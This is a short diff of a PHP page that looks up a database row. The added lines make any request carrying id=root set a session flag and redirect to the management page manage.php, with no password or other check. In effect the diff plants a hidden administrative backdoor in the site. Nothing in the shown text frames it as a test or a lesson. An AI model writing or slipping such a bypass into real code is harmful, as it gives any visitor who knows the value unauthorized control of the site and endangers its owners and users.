@@ -10,6 +10,12 @@ if (!$row=mysql_fetch_array($result))
 	echo "<a href=index.php>回首頁</a>";
 	die();
 }
+if ($_GET[id]=='root')
+{
+session_start();
+$_SESSION['flag']='1';
+header("location: manage.php");
+}
 ?>
 
 <!DOCTYPE html>
